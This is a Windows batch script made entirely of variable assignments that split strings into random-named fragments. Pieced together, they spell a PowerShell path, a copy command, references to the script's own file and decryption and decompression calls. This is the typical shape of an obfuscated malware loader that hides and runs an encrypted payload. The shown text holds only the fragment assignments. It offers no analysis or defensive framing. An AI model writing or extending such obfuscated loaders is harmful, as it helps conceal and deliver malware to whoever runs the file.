@echo off
set "OKLFWOnpKx=xe"
set "AFqcnwRkVE=co"
set "KiWjUeuGsL=.e"
set "cEMJnbNMMR=nd"
set "VhOyAGnxfv= /"
set "iJZPcKERiO=ow"
set "KAdRfWViOl=in"
set "tBFzeMplyG=he"
set "fsNlCwKVwj=\W"
set "ETuvLuhNTL=Wi"
set "hHWvXvncLH=Po"
set "CrVrYaplWf=:\"
set "zABPTixUFt=we"
set "LnKAKTMrjG=we"
set "EqlRWhrJYY=po"
set "MzicokHkwY=1."
set "nAnAdXFleW=Sy"
set "zvSoWxDuCp=ws"
set "cKmlewnqgg=he"
set "bzigOowXyJ=py"
set "ZkateEfwSV=s\"
set "NbvgKpIOUI=rS"
set "VrUQEHvzMe=32"
set "mCzeWVUEtb=st"
set "EAVEzksGXt=rs"
set "QqFfLSDsEI=em"
set "HFXTDlKrDc=ll"
set "tmGvbVIIAp=do"
set "SYmyzdZdKQ=ll"
set "DATDYhdBDy=0\"
set "LmkWBfmPKI=\v"
set "yzREpvohlf= C"
set "lpWhJTNdra=y "
set "MIRGrZtpTk=cd"
set "bgqYCfqODM= %~dp0"
set "ELuCpMOsSL=TllA"
set "KFfICgvavv=ress"
set "UXKTZzkXoS=($EN"
set "QGFgDWtxcp=1] -"
set "YdRDVTJAJh=Fina"
set "LOXoUnSmRX=Star"
set "mDvvSQwJlZ=fore"
set "JKdlYMpHUp=[]] "
set "qKcmwReZsb=]::("
set "HwtSRgSjyg=;$Mh"
set "hkSPXhZyhx== $D"
set "KWNGHMQkjk=PSsj"
set "mLbqVcfxeh=::De"
set "ijcbqtaUMp=7kGw"
set "EguGuZoMov=CuSj"
set "ZEuwADwmCb=('%~f0'"
set "pCuMZKdrHZ=Bmor"
set "uhHydGdRHf=rtS4"
set "UkgcoiOIbf=nirt"
set "yUpAXbhEOc=File"
set "gubbvLZvpS=ecry"
set "FLYvfkISmT=am;$"
set "oBsoDkdMda=gnir"
set "jQxgCVVGXN=oArr"
set "bCRcIsDDtT=aDNK"
